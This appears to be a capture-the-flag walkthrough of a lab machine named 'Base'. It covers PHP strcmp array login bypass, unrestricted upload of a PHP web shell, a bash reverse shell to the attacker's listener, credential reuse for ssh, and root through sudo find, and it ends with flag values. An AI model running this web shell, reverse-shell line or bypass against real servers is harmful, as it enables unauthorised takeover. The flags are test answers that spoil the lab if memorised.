@@ -1,0 +1,224 @@
+Base Lab: Vulnerabilities: Exposed directories, Weak string compare function (strcmp), unrestricted file upload, web command injection
+
+
+Enumeration:
+└──╼ $sudo nmap -sC -sV -p- --min-rate=1000 10.129.62.236
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
+|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
+|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome to Base
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+This takes me to a website, where there’s also a login screen.
+http://10.129.62.236/login/login.php
+If we go back one:
+http://10.129.62.236/login
+We can see contents, such as login.php.swp, which can contain valuable information
+strings login.php.swp
+strings login.php.swp >> file.txt
+tac file.txt
+
+We see this function:
+if (strcmp($username , $_POST['username']) == 0) {
+ if (strcmp($password, $_POST['password']) == 0) {
+
+The strcmp function can be manipulated by giving an empty array so it returns null, which is equivalent to 0. 
+
+Let’s see if we can find anything on burp suite after submitting fake credentials:
+
+Request:
+POST /login/login.php HTTP/1.1
+Host: 10.129.62.236
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.62.236/login/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://10.129.62.236
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=f2boji19atghcpmmvloc2o9ko6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=hello&password=1234
+
+Now we manipulate it so they are given empty arrays:
+POST /login/login.php HTTP/1.1
+Host: 10.129.62.236
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.62.236/login/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://10.129.62.236
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=f2boji19atghcpmmvloc2o9ko6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username[]=hello&password[]=1234
+
+We forward the intercepted and manipulated request, and we made it into the webpage.
+
+We made it to upload.php, which allows us to upload files to the base server
+
+On attack machine:
+echo "<?php phpinfo(); ?>" > test.php
+
+We uploaded that using the file upload future, now we need to find directories where this file may be stored:
+gobuster dir --url http://10.10.10.48/ --wordlist /usr/share/wordlists/dirb/big.txt
+
+We find this directory containing our test.php:
+http://10.129.62.236/_uploaded/
+
+On our attack:
+
+Create text file:
+sudo nano webshell.php:
+
+Contents:
+<?php echo system($_REQUEST['cmd']);?>
+
+
+Now go back to the _uploaded page:
+
+Use the URL to execute commands now
+http://10.129.62.236/_uploaded/webshell.php?cmd=id
+
+Output:
+uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Intercept this into burpsuite, we can see:
+
+GET /_uploaded/webshell.php?cmd=id HTTP/1.1
+Host: 10.129.62.236
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=f2boji19atghcpmmvloc2o9ko6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+Right click and change HTTP request to a post method, here’s the new request:
+POST /_uploaded/webshell.php HTTP/1.1
+Host: 10.129.62.236
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=f2boji19atghcpmmvloc2o9ko6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+cmd=whoami
+
+
+
+In the cmd field, let’s initiate a reverse shell by making it come to our port:
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4440 0>&1'
+
+POST /_uploaded/webshell.php HTTP/1.1
+Host: 10.129.62.236
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=f2boji19atghcpmmvloc2o9ko6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4440 0>&1'
+
+
+Make sure to encode the /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4440 0>&1' by right clicking and ‘convert selection’ to encode all key characters
+
+POST /_uploaded/webshell.php HTTP/1.1
+Host: 10.129.62.236
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=f2boji19atghcpmmvloc2o9ko6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/4440+0>%261'
+
+Start up netcat
+nc lvnp 4440
+
+We have access to :www-data@base:/var/www/html/_uploaded$ 
+
+Let’s try to find some flags:
+find . -name "*.txt" 2>/dev/null
+
+Output:
+./home/john/user.txt
+
+Lateral movement:
+www-data@base:/$ cat /var/www/html/login/config.php
+cat /var/www/html/login/config.php
+<?php
+$username = "admin";
+$password = "thisisagoodpassword"
+
+We can ssh into john with the password from above
+
+john@base:~$ cat user.txt
+f54846c258f3b4612f78a819573d158e
+
+Privilege Escalation:
+john@base:~$ sudo -l
+[sudo] password for john: 
+Matching Defaults entries for john on base:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on base:
+    (root : root) /usr/bin/find
+
+We see find is there, and we can use this;
+https://gtfobins.github.io/ 
+GTFOBins is a curated list of Unix binaries that can be used to bypass local security
+restrictions in misconfigured systems.
+
+This can be used to break out from restricted environments by spawning an interactive system shell:
+find . -exec /bin/sh \; -quit
+
+$ sudo find . -exec /bin/sh \; -quit
+# whoami
+root
+
+# cat root.txt	
+51709519ea18ab37dd6fc58096bea949
+
+
